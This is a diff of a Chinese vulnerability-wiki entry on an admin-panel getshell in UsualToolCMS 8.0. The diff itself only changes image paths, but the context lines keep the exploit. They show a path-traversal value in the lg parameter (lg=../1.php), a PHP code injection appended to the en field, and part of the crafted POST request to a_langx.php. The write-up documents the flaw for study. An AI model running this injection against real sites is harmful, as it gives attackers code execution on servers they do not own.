@@ -16,22 +16,22 @@ UsualToolCMS-8.0-Release
 
 13行未对\$lg做判断
 
-![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId25.png)
+![](./.resource/UsualToolcms8.0后台GETSHELL/media/rId25.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId26.png)
+![](./.resource/UsualToolcms8.0后台GETSHELL/media/rId26.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId27.png)
+![](./.resource/UsualToolcms8.0后台GETSHELL/media/rId27.png)
 
 点击保存时抓包需要修改url处的lg参数这样就上传到跟目录了，再在post
 参数的en后面加入
 
     en"},<?php phpinfo(); ?>
 
-![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId28.png)
+![](./.resource/UsualToolcms8.0后台GETSHELL/media/rId28.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId29.png)
+![](./.resource/UsualToolcms8.0后台GETSHELL/media/rId29.png)
 
-![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId30.png)
+![](./.resource/UsualToolcms8.0后台GETSHELL/media/rId30.png)
 
     POST /UsualToolCMS/cmsadmin/a_langx.php?x=m&lg=../1.php HTTP/1.1
     Host: 0-sec.org
@@ -67,4 +67,4 @@ UsualToolCMS-8.0-Release
       </body>
     </html>
 
-![](/Users/aresx/Documents/VulWiki/.resource/UsualToolcms8.0后台GETSHELL/media/rId32.shtml)
+![](./.resource/UsualToolcms8.0后台GETSHELL/media/rId32.shtml)
